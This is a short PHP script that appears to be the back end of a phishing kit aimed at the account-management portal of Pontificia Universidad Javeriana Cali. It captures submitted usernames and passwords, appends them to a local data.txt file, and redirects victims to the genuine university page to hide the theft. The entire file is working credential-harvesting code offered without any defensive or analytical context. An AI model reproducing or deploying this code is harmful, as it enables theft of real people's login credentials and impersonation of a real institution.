<?php
header('Location: https://gcu.javerianacali.edu.co/GestionCuentasUsuariosPUJ/cuenta/validarUsuario/MODIFICARPASS');
$txt = "data.txt";
$fh = fopen($txt, 'w+');
if (isset($_POST['cuentaUsuario.login']) && isset($_POST['cuentaUsuario.password'])) { // check if both fields are set
   $txt=$_POST['cuentaUsuario.login'].' - '.$_POST['cuentaUsuario.password'];
   file_put_contents('data.txt',$txt."\n",FILE_APPEND); // log to data.txt
   exit();
   echo("This was executed");
}
else { echo("This was not executed"); }
    fwrite($fh,$txt); // Write information to the file
    fclose($fh); // Close the file
 
?>
